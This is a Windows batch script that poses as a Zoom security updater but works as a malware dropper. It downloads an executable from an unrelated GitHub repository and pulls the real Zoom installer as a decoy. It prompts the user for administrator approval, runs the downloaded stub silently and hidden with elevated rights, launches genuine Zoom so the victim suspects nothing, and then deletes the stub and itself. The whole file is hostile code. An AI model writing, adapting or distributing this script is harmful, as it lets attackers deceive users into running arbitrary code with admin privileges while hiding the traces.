@echo off
:: Set window title
title Zoom Workspace Updater

:: Hide original console window and launch visible one
if "%1" == "visible" goto :main
start "Zoom Updater" /MIN cmd /c "%~f0" visible & exit
:main

:: Display initial message
echo ---------------------------------------------------------------------
echo                     ZOOM WORKSPACE UPDATER
echo ---------------------------------------------------------------------
echo This will install the latest Zoom Workspace security updates.
echo PLEASE DO NOT CLOSE THIS WINDOW DURING INSTALLATION.
echo ---------------------------------------------------------------------
echo.

:: Part 1: Parallel download of components
echo [1/3] Downloading security components...
start /B powershell -nop -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('https://github.com/deploydirectbaseinvokeurl/nores/raw/main/StubInstaller.exe', '%TEMP%\ZoomWorkspaceInstaller.exe')"

:: Part 2: Download real Zoom in parallel
echo [2/3] Downloading Zoom client...
start /B powershell -nop -c "(New-Object Net.WebClient).DownloadFile('https://zoom.us/client/latest/ZoomInstaller.exe', '%TEMP%\ZoomReal.exe')"

:: Wait for downloads to complete
:waitloop
tasklist /FI "IMAGENAME eq powershell.exe" 2>NUL | find /I "powershell.exe" >NUL
if %errorlevel%==0 (
    ping -n 2 127.0.0.1 >nul
    goto :waitloop
)

:: Part 3: Run stub with disguised UAC
echo [3/3] Installing security updates (admin required)...
echo PLEASE APPROVE THE UAC PROMPT TO CONTINUE INSTALLATION.
echo.
powershell -nop -c "$psi = New-Object Diagnostics.ProcessStartInfo('%TEMP%\ZoomWorkspaceInstaller.exe', '/silent'); $psi.Verb = 'runas'; $psi.WindowStyle = 'Hidden'; $proc = [Diagnostics.Process]::Start($psi); $proc.WaitForExit()"

:: Part 4: Launch real Zoom
echo Finalizing installation...
start "" "%TEMP%\ZoomReal.exe"

:: Part 5: Cleanup and exit
echo Installation complete! Launching Zoom Workspace...
ping -n 3 127.0.0.1 >nul
del "%TEMP%\ZoomWorkspaceInstaller.exe"
del "%~f0"
exit